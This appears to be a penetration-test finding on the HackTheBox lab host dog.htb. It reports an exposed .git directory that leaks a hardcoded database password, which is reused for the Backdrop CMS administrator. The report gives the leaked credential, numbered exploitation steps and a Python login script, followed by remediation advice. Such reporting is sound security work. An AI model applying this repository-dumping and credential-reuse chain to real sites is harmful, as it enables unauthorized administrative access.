# Exposed Git Repository and Credential Reuse Leading to Backdrop CMS Authenticated Access

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-28 07:53:45 UTC
**Target:** http://dog.htb
**CWE:** CWE-200
**CVSS:** 9.1

## Description

The web application root directory has an exposed `.git` directory (`http://dog.htb/.git/`). This allows an unauthenticated attacker to download the entire source code repository, including configuration files and commit history. 

Analysis of the `settings.php` file within the repository revealed hardcoded database credentials (`mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop`). Furthermore, inspecting the active configuration files (`files/config_.../active/update.settings.json`) revealed the email address of an administrator: `tiffany@dog.htb`.

By leveraging the exposed email address as a username and reusing the discovered database password (`BackDropJ2024DS2024`), it was possible to authenticate to the Backdrop CMS admin panel successfully.

## Impact

An attacker can gain unauthorized administrative access to the Backdrop CMS installation by extracting credentials and user information from the exposed Git repository and leveraging password reuse.

## Technical Analysis

The `.git` directory is accessible over the web, meaning that tools like `git-dumper` can recreate the repository structure. The `settings.php` file contained:
`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`

The JSON configuration files contained:
`"update_emails": ["tiffany@dog.htb"]`

The password `BackDropJ2024DS2024` was reused for the `tiffany` user account in the Backdrop CMS.

## Proof of Concept

1. Navigate to `http://dog.htb/.git/config` to verify the repository is exposed.
2. Use a tool like `git-dumper` to download the repository.
3. Read `settings.php` to obtain the database password.
4. Search the active JSON configuration files for email addresses (`grep -R "email"`).
5. Navigate to `http://dog.htb/?q=user/login`.
6. Log in using `tiffany` or `tiffany@dog.htb` and the password `BackDropJ2024DS2024`.

```
import requests

url = "http://dog.htb/.git/config"
res = requests.get(url)
print(res.text)

# Login
login_url = "http://dog.htb/?q=user/login"
session = requests.Session()
from bs4 import BeautifulSoup
res = session.get(login_url)
soup = BeautifulSoup(res.text, "html.parser")
form_build_id = soup.find("input", {"name": "form_build_id"})["value"]

data = {
    "name": "tiffany@dog.htb",
    "pass": "BackDropJ2024DS2024",
    "form_build_id": form_build_id,
    "form_id": "user_login",
    "op": "Log in"
}
post_res = session.post(login_url, data=data)
if "Log out" in post_res.text or "Dashboard" in post_res.text:
    print("Login successful!")
```

## Remediation

1. Restrict access to the `.git` directory using web server configuration (e.g., Apache `.htaccess` or site configuration).
2. Avoid hardcoding passwords in source code repositories.
3. Use different passwords for different services (database vs. CMS users).
